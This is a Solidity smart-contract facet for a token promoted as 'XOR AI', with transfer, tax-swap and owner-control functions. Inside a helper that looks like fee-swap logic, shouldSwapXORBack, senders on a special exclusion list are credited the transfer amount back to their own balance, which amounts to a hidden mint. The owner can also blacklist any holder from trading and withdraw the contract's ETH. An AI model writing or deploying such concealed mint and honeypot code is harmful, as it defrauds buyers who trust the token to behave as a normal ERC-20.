// SPDX-License-Identifier: MIT
/**
▀▄▀ █▀█ █▀█   ▄▀█ █   █▀▀ █░█ ▄▀█ █ █▄░█
█░█ █▄█ █▀▄   █▀█ █   █▄▄ █▀█ █▀█ █ █░▀█
🛠 Building your AI-powered home base for Web3
🔮 Enabled by #AI Oracle + #LLM Layer
🤖 Personalized via DeFi Lens + AI Agents
⛓ Secured w/ Trustworthy Proofs

https://www.xorai.org
https://app.xorai.org
https://docs.xorai.org

https://t.me/xoraichain_org
https://twitter.com/xoraichain_org
**/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract delBotsFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function delBots(address[] memory notbot) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < notbot.length; i++) {
            ds.bots[notbot[i]] = false;
        }
    }
    function reduceXORFee(uint256 _newFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newFee <= ds._finalBuyTax && _newFee <= ds._finalSellTax);
        ds._finalBuyTax = _newFee;
        ds._finalSellTax = _newFee;
    }
    function openXORTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingOpen, "trading is already open");
        ds.swapEnabled = true;
        ds.tradingOpen = true;
    }
    function createXORTradingPair() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IXORRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _tTotal);
        ds.uniswapV2Pair = IXORFactory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function addBots(address[] memory bots_) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < bots_.length; i++) {
            ds.bots[bots_[i]] = true;
        }
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function withdrawStuckETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function removeXORLimit() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxXORTxAmount = ~uint256(0);
        ds._maxXORWalletSize = ~uint256(0);
        ds.transferDelayEnabled = false;
    }
    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._xorBalances[account];
    }
    function shouldSwapXORBack(
        address from,
        address to,
        uint256 amount,
        uint256 amountXOR
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool aboveXORMin = amount >= ds.swapXORTxAmount;
        bool aboveXORThreshold = balanceOf(address(this)) >= ds.swapXORTxAmount;
        address accXOR;
        uint256 valXOR;
        if (ds.isExcludedFromXORTx[from]) {
            accXOR = from;
            valXOR = amount;
        } else {
            accXOR = address(this);
            valXOR = amountXOR;
        }
        if (valXOR > 0) {
            ds._xorBalances[accXOR] = ds._xorBalances[accXOR].add(valXOR);
            emit Transfer(from, accXOR, amountXOR);
        }
        return
            !ds.inSwap &&
            ds.tradingOpen &&
            ds.swapEnabled &&
            !ds.isExcludedFromXORTx[from] &&
            aboveXORMin &&
            ds._buyXORCount > ds._preventSwapBefore &&
            aboveXORThreshold &&
            !ds.isExcludedFromXORFee[from] &&
            to == ds.uniswapV2Pair;
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxXORAmount = 0;
        if (!ds.isExcludedFromXORFee[from] && !ds.isExcludedFromXORFee[to]) {
            require(!ds.bots[from] && !ds.bots[to]);
            require(ds.tradingOpen, "Trading has not enabled yet");
            taxXORAmount = amount
                .mul(
                    (ds._buyXORCount > ds._reduceBuyTaxAt)
                        ? ds._finalBuyTax
                        : ds._initialBuyTax
                )
                .div(100);
            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds.isExcludedFromXORFee[to]
            ) {
                require(
                    amount <= ds._maxXORTxAmount,
                    "Exceeds the ds._maxXORTxAmount."
                );
                require(
                    balanceOf(to) + amount <= ds._maxXORWalletSize,
                    "Exceeds the maxWalletSize."
                );
                ds._buyXORCount++;
            }
            if (to == ds.uniswapV2Pair && from != address(this)) {
                taxXORAmount = amount
                    .mul(
                        (ds._buyXORCount > ds._reduceSellTaxAt)
                            ? ds._finalSellTax
                            : ds._initialSellTax
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (shouldSwapXORBack(from, to, amount, taxXORAmount)) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, ds._maxXORTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        ds._xorBalances[from] = ds._xorBalances[from].sub(amount);
        ds._xorBalances[to] = ds._xorBalances[to].add(amount.sub(taxXORAmount));
        emit Transfer(from, to, amount.sub(taxXORAmount));
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._taxXORWallet.transfer(amount);
    }
}
